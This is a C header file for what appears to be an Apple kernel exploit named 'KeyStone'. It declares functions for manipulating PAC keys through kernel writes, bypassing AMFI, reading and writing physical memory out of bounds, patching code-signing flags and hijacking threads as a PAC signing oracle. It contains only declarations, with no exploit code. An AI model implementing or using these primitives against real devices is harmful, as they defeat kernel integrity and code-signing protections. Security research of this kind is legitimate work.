#ifndef kpac_bypass_h
#define kpac_bypass_h

#include <stdint.h>
#include <stdbool.h>

// ── Exploit name ──────────────────────────────────────────────────────────
#define KPAC_BYPASS_EXPLOIT_NAME    "KeyStone"
#define KPAC_BYPASS_EXPLOIT_VERSION "1.0"
// ───────────────────────────────────────────────────────────────────────────

// ---------------------------------------------------------------------------
// CS flag constants (proc_ro.p_csflags)
// ---------------------------------------------------------------------------
#define CS_VALID           0x00000001
#define CS_GET_TASK_ALLOW  0x00000004
#define CS_ENFORCEMENT     0x00000020
#define CS_HARD            0x00000100
#define CS_KILLED          0x00000200
#define CS_PLATFORM_BINARY 0x04000000
#define CS_INSTALLER       0x08000000

// ---------------------------------------------------------------------------
// Thread-based PAC key manipulation (works via kwrite64, no PPL needed)
// ---------------------------------------------------------------------------

// Read a remote thread's jop_pid/rop_pid from kernel memory.
// Returns false if threadAddr is invalid.
bool kpac_read_thread_pac_keys(uint64_t threadAddr, uint64_t *jop_pid, uint64_t *rop_pid);

// Set a thread's jop_pid/rop_pid via kwrite64 (non-PPL memory).
void kpac_set_thread_pac_keys(uint64_t threadAddr, uint64_t jop_pid, uint64_t rop_pid);

// Copy jop_pid/rop_pid from srcThread to dstThread.
bool kpac_copy_pac_context(uint64_t srcThread, uint64_t dstThread);

// ---------------------------------------------------------------------------
// AMFI bypass integration (calls amfi_patch_self)
// ---------------------------------------------------------------------------

// Patch self OSEntitlements + best-effort try to set proc csflags.
bool kpac_platformize_self(void);

// ---------------------------------------------------------------------------
// Physical OOB helpers (exported from kexploit_opa334)
// ---------------------------------------------------------------------------

// Try to read/write a kernel virtual address via OOB physical.
// Falls back to early_kread64/early_kwrite64 for non-PPL addresses.
// Returns true if the OOB path was used.
bool kpac_phys_read(uint64_t kaddr, void *buf, size_t size);
bool kpac_phys_write(uint64_t kaddr, const void *buf, size_t size);

// ---------------------------------------------------------------------------
// proc_ro.csflags patch via physical write (requires PPL page access)
// ---------------------------------------------------------------------------

// Convert a kernel virtual address to a physical address by walking the
// kernel page table.  Returns 0 on failure.
uint64_t kpac_virt_to_phys(uint64_t kaddr);

// Try to write p_csflags for the given proc via physical memory.
// Requires the physical page of proc_ro to be reachable via OOB.
// Returns true if the write was attempted (may be a no-op if the page is
// not reachable).
bool kpac_write_csflags(uint64_t proc, uint32_t csflags);

// ---------------------------------------------------------------------------
// Signing oracle (thread hijacking via ml_sign_thread_state)
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Trust cache research
// ---------------------------------------------------------------------------

// Find trust_cache_rt kernel global (needs XPF offline analysis).
uint64_t kpac_find_trust_cache_rt(void);

// Dump the trust cache linked list starting from trust_cache_rt.
int kpac_dump_trust_cache(void);

// Dump a trust cache entry at a known kernel virtual address.
int kpac_scan_trust_cache(uint64_t address);

// ---------------------------------------------------------------------------
// Signing oracle (thread hijacking via ml_sign_thread_state)
// ---------------------------------------------------------------------------

// Check if the bad_recovery-style PAC signing oracle gadget is available.
bool kpac_signing_oracle_available(void);

// Use ml_sign_thread_state to PAC-sign a buffer (userland context).
// Returns a PAC'd pointer or 0 on failure.
uint64_t kpac_sign_thread_state(uint64_t thread_kaddr);

#endif
